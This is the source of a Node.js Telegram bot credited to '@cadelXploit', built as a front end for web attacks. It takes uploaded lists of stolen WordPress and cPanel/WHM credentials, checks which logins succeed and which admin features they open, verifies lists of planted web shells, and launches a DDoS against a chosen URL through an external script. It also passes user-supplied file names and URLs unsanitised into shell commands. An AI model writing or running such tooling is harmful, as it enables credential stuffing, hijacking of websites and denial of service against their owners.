const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const token = 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(token, { polling: true });

let isDDOSRunning = false; // Variabel untuk menandai apakah serangan DDOS sedang berlangsung

function sendProgressUpdate(chatId, messageId, progress) {
    bot.editMessageText(`File received. Starting the check... ${progress}%`, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: {
            inline_keyboard: [[{ text: `Progress: ${progress}%`, callback_data: 'progress' }]]
        }
    });
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    const currentDate = new Date().toDateString();

    bot.sendMessage(chatId, `Halo selamat malam ${username}! 👋🏻\n\nSaya adalah bot yang dibuat oleh @cadelXploit.\n\nUntuk melihat menu lainnya, bisa pencet tombol di bawah ini.\n\n🗓 TANGGAL: ${currentDate}`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'WordPress Checker', callback_data: 'wpcek' },
                    { text: 'cPanel Login Checker', callback_data: 'cpcek' },
                    { text: 'Shell Checker', callback_data: 'shellcek' }
                ],
                [
                    { text: 'DDOS Attack', callback_data: 'ddos' },
                    { text: 'HTTP Checker', callback_data: 'http' },
                    { text: 'Owner', url: 'https://t.me/cadelXploit' }
                ]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const { data } = query;

    switch (data) {
        case 'wpcek':
            bot.sendMessage(chatId, `WordPress Checker\n\nCommand: /wpcek\n\nDescription: Use this command to check WordPress sites for login success and specific features like WP File Manager, Plugin Install, Theme Editor, Add Page, and Add Article.\n\nPlease send the file with the list of WordPress sites.`);
            break;
        case 'cpcek':
            bot.sendMessage(chatId, `cPanel Login Checker\n\nCommand: /cpcek\n\nDescription: Use this command to check cPanel and WHM login credentials. Please send the file with the list of accounts in the format URL|username|password.`);
            break;
        case 'ddos':
            bot.sendMessage(chatId, `DDOS Attack\n\nCommand: /ddos <url>\n\nDescription: Use this command to perform a DDOS attack on the specified URL for a specified duration.\n\nExample: /ddos example.com 90`);
            break;
        case 'http':
            bot.sendMessage(chatId, `HTTP Checker\n\nCommand: /http <url>\n\nDescription: Use this command to check HTTP status of a URL.\n\nPlease enter the URL to check HTTP status.`);
            break;
        case 'shellcek':
            bot.sendMessage(chatId, `Shell Checker\n\nCommand: /shellcek\n\nDescription: Use this command to check HTTP status of multiple URLs listed in a file. Please send the file with the list of websites.`);
            break;
        default:
            break;
    }

    bot.answerCallbackQuery(query.id); // Close the button spinner
});

bot.onText(/\/wpcek/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the file with the list of WordPress sites.');

    bot.once('document', (msg) => {
        const fileId = msg.document.file_id;
        const filePath = `./${msg.document.file_name}`;
        const fileStream = bot.getFileStream(fileId);
        const writeStream = fs.createWriteStream(filePath);

        fileStream.pipe(writeStream).on('finish', () => {
            bot.sendMessage(chatId, 'File received. Starting the check...', {
                reply_markup: {
                    inline_keyboard: [[{ text: 'Progress: 0%', callback_data: 'progress' }]]
                }
            }).then(sentMessage => {
                const messageId = sentMessage.message_id;
                let progress = 0;

                const intervalId = setInterval(() => {
                    sendProgressUpdate(chatId, messageId, progress);
                    progress += 10; // Increment progress by 10%
                }, 5000); // Check progress every 5 seconds

                exec(`python3 wpcek.py ${filePath} 10`, (error, stdout, stderr) => {
                    clearInterval(intervalId); // Stop checking progress
                    if (error) {
                        bot.sendMessage(chatId, `Error: ${error.message}`);
                        console.error(`Error: ${error.message}`);
                        return;
                    }
                    if (stderr) {
                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
                        console.error(`Stderr: ${stderr}`);
                        return;
                    }

                    console.log(`Stdout: ${stdout}`);
                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging

                    const filesToSend = [
                        { path: './loginSuccess.txt', name: 'Login Success' },
                        { path: './wpfilemanager.txt', name: 'WP File Manager' },
                        { path: './plugin-install.txt', name: 'Plugin Install' },
                        { path: './wptheme.txt', name: 'Theme Editor' },
                        { path: './page.txt', name: 'Add Page' },
                    ];

                    let sentAnyFile = false;
                    filesToSend.forEach(file => {
                        if (fs.existsSync(file.path)) {
                            bot.sendDocument(chatId, file.path, { caption: `Results for ${file.name}` }).then(() => {
                                fs.unlinkSync(file.path);
                            });
                            sentAnyFile = true;
                        }
                    });

                    if (!sentAnyFile) {
                        bot.sendMessage(chatId, 'No successful logins or specific features found.');
                    }
                });
            });
        });

        writeStream.on('error', (error) => {
            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
            console.error(`Failed to write file: ${error.message}`);
        });
    });
});

bot.onText(/\/cpcek/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the file with the list of cPanel accounts in the format URL|username|password.');

    bot.once('document', (msg) => {
        const fileId = msg.document.file_id;
        const filePath = `./${msg.document.file_name}`;
        const fileStream = bot.getFileStream(fileId);
        const writeStream = fs.createWriteStream(filePath);

        fileStream.pipe(writeStream).on('finish', () => {
            bot.sendMessage(chatId, 'File received. Starting the check...', {
                reply_markup: {
                    inline_keyboard: [[{ text: 'Progress: 0%', callback_data: 'progress' }]]
                }
            }).then(sentMessage => {
                const messageId = sentMessage.message_id;
                let progress = 0;

                const intervalId = setInterval(() => {
                    sendProgressUpdate(chatId, messageId, progress);
                    progress += 10; // Increment progress by 10%
                }, 5000); // Check progress every 5 seconds

                exec(`python3 cp.py ${filePath} 10`, (error, stdout, stderr) => {
                    clearInterval(intervalId); // Stop checking progress
                    if (error) {
                        bot.sendMessage(chatId, `Error: ${error.message}`);
                        console.error(`Error: ${error.message}`);
                        return;
                    }
                    if (stderr) {
                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
                        console.error(`Stderr: ${stderr}`);
                        return;
                    }

                    console.log(`Stdout: ${stdout}`);
                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging

                    const goodFilePath = './good.txt';
                    if (fs.existsSync(goodFilePath)) {
                        bot.sendDocument(chatId, goodFilePath, { caption: 'Successful logins: URL|username|password' }).then(() => {
                            fs.unlinkSync(goodFilePath);
                        });
                    } else {
                        bot.sendMessage(chatId, 'No successful logins found.');
                    }
                });
            });
        });

        writeStream.on('error', (error) => {
            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
            console.error(`Failed to write file: ${error.message}`);
        });
    });
});

bot.onText(/\/ddos (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1];
    const duration = 90; // Default duration, you can change this as needed

    if (isDDOSRunning) {
        bot.sendMessage(chatId, 'Sorry, another DDOS attack is already in progress. Please wait until it finishes.');
        return;
    }

    isDDOSRunning = true;

    bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);

    exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
        isDDOSRunning = false; // Reset the flag after attack is finished
        if (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
            console.error(`Error: ${error.message}`);
            return;
    }
    if (stderr) {
        bot.sendMessage(chatId, `Stderr: ${stderr}`);
        console.error(`Stderr: ${stderr}`);
        return;
    }

    console.log(`Stdout: ${stdout}`);
    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
});
});

bot.onText(/\/shellcek/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the file with the list of websites.');

    bot.once('document', (msg) => {
        const fileId = msg.document.file_id;
        const filePath = `./${msg.document.file_name}`;
        const fileStream = bot.getFileStream(fileId);
        const writeStream = fs.createWriteStream(filePath);

        fileStream.pipe(writeStream).on('finish', () => {
            bot.sendMessage(chatId, 'File received. Starting the check...', {
                reply_markup: {
                    inline_keyboard: [[{ text: 'Progress: 0%', callback_data: 'progress' }]]
                }
            }).then(sentMessage => {
                const messageId = sentMessage.message_id;
                let progress = 0;

                const intervalId = setInterval(() => {
                    sendProgressUpdate(chatId, messageId, progress);
                    progress += 10; // Increment progress by 10%
                }, 5000); // Check progress every 5 seconds

                exec(`python3 shell.py ${filePath} 10`, (error, stdout, stderr) => {
                    clearInterval(intervalId); // Stop checking progress
                    if (error) {
                        bot.sendMessage(chatId, `Error: ${error.message}`);
                        console.error(`Error: ${error.message}`);
                        return;
                    }
                    if (stderr) {
                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
                        console.error(`Stderr: ${stderr}`);
                        return;
                    }

                    console.log(`Stdout: ${stdout}`);
                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging

                    const goodFilePath = './goodshell.txt';
                    if (fs.existsSync(goodFilePath)) {
                        bot.sendDocument(chatId, goodFilePath, { caption: 'Successful shells: URL' }).then(() => {
                            fs.unlinkSync(goodFilePath);
                        });
                    } else {
                        bot.sendMessage(chatId, 'No successful shells found.');
                    }
                });
            });
        });

        writeStream.on('error', (error) => {
            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
            console.error(`Failed to write file: ${error.message}`);
        });
    });
});

bot.on('polling_error', (error) => console.log(`Polling Error: ${error.message}`));
